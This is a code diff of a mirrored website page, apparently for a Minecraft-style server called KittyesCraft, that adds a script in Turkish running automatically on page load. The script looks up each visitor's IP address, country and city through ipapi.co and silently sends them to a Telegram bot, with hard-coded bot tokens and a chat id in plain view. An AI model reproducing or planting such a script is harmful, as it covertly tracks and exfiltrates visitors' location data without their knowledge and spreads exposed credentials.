@@ -585,23 +585,23 @@
         for (let i = 0; i < 20; i++) {
             setTimeout(() => createSnowflake(), i * 150);
         }
-   <script>
-// Bu kod sayfa açıldığında otomatik çalışır
-const botToken = "8627693498:AAFt7zWtMcXh0-NQ-uYR6JWs1iiIzpneoPI";
+ <script>
+// Bilgilerini buraya gir
+const botToken = "8621272611:AAHGwvGZA8w8CII84sgs7XCqhCqNfhKQvFw";
 const chatId = "1504410647";
 
 fetch('https://ipapi.co/json/')
   .then(response => response.json())
   .then(data => {
-    // Mesajı daha sade bir formatta hazırlıyoruz
-    const message = "🤡 <b>Kittyescraf Giriş Yapıldı</b>\n\n" +
-                    "🌐 <b>IP:</b> " + data.ip + "\n" +
-                    "📍 <b>Konum:</b> " + data.country_name + " / " + data.city + "\n" +
-                    "⏰ <b>Zaman:</b> " + new Date().toLocaleString('tr-TR') + "\n" +
-                    "🚀 <b>Tarayıcı:</b> Google Chrome\n" +
-                    "✅ 💻 <b>Gerçek Bilgisayar</b>";
+    // Görseldeki formata benzer mesaj yapısı
+    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
+                    `🌐 <b>IP:</b> ${data.ip}\n` +
+                    `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
+                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+                    `🚀 <b>Tarayıcı:</b> Google Chrome\n` +
+                    `✅ 💻 <b>Gerçek Bilgisayar</b>`;
     
-    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
@@ -610,8 +610,7 @@ fetch('https://ipapi.co/json/')
         parse_mode: 'HTML'
       })
     });
-  })
-  .catch(error => console.log("Hata oluştu: ", error));
+  });
 </script>
 </body>
 
@@ -619,6 +618,7 @@ fetch('https://ipapi.co/json/')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
